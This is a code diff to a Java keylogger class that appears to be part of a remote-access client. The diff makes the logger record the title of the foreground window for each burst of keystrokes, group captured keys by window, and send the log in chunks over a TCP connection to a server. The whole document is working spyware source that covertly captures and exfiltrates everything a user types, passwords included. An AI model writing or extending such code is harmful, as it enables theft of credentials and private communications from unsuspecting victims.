@@ -4,13 +4,17 @@ import Server.IntervalThread;
 import SocketMessageReceiver.DataType.KeyLogRequest;
 import SocketMessageSender.CustomUserSender.KeyLogSender;
 import Utilities.Utilities;
+import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.User32;
 import lc.kra.system.keyboard.GlobalKeyboardHook;
 import lc.kra.system.keyboard.event.GlobalKeyEvent;
 import lc.kra.system.keyboard.event.GlobalKeyListener;
 
 import java.awt.event.KeyEvent;
+import java.lang.annotation.Native;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.HashMap;
 
 public class KeyLogger {
     private static final int LIMIT_LOG_SIZE = 1024; //Chars
@@ -19,7 +23,7 @@ public class KeyLogger {
     public long interval;
     public boolean isRunning;
 
-    private StringBuilder log = new StringBuilder();
+    private HashMap<Pointer, StringBuilder> log = new HashMap<>();
 
     private GlobalKeyListener listener;
     private GlobalKeyboardHook keyboardHook;
@@ -40,7 +44,19 @@ public class KeyLogger {
                 var keyCode = globalKeyEvent.getVirtualKeyCode();
                 var keyChar = keyCode == GlobalKeyEvent.VK_RETURN ? '\n' : "[" + KeyEvent.getKeyText(keyCode) + "]";
 
-                log.append(keyChar);
+                char[] buffer = new char[1024];
+                var user32 = User32.INSTANCE;
+                var foregroundWindow = user32.GetForegroundWindow();
+
+                user32.GetWindowText(foregroundWindow, buffer, buffer.length);
+
+                var pointer = foregroundWindow.getPointer();
+                if (!log.containsKey(pointer)) {
+                    log.put(pointer, new StringBuilder());
+                    log.get(pointer).append("Window: ").append(String.valueOf(buffer).trim()).append("\n");
+                }
+
+                log.get(pointer).append(keyChar);
             }
 
             @Override
@@ -65,10 +81,16 @@ public class KeyLogger {
     }
 
     private void Log() {
-        var logSize = log.length();
+        var bigLog = new StringBuilder();
+
+        for (var entry : log.entrySet()) {
+            bigLog.append(entry.getValue()).append("\n").append("==================================================").append("\n");
+        }
+
+        var logSize = bigLog.length();
         var splitSize = Math.round((logSize * 1.0f / LIMIT_LOG_SIZE) + .5f);
 
-        var bigLog = log.toString();
+
         var sender = new KeyLogSender(ClientInstance.tcpClient);
         var uuid = Utilities.getUUID();
 
@@ -82,9 +104,10 @@ public class KeyLogger {
 
             var log = bigLog.substring(start, end);
 
+            System.out.println(log);
             sender.send(null, new KeyLogRequest(uuid, log, dateStr));
         }
 
-        log = new StringBuilder();
+        log.clear();
     }
 }
